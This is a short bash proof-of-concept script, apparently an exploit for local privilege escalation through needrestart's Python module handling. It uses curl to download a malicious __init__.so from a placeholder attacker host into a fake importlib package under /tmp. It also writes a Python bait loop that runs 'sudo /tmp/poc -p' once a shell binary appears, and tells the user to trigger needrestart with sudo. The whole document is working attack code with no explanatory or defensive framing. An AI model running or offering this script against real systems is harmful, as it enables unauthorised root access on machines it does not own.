#!/bin/bash
set -e
cd /tmp

mkdir -p malicious/importlib

curl http://<attacker ip>:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

cat <<<'
import time
import os

while True:
	try:
		import importlib
	except:
		pass
		
	if os.path.exists("/tmp/poc"):
		print("Shell received")
		os.system("sudo /tmp/poc -p")
		break
	time.sleep(1)' > /tmp/malicious/e.py

echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
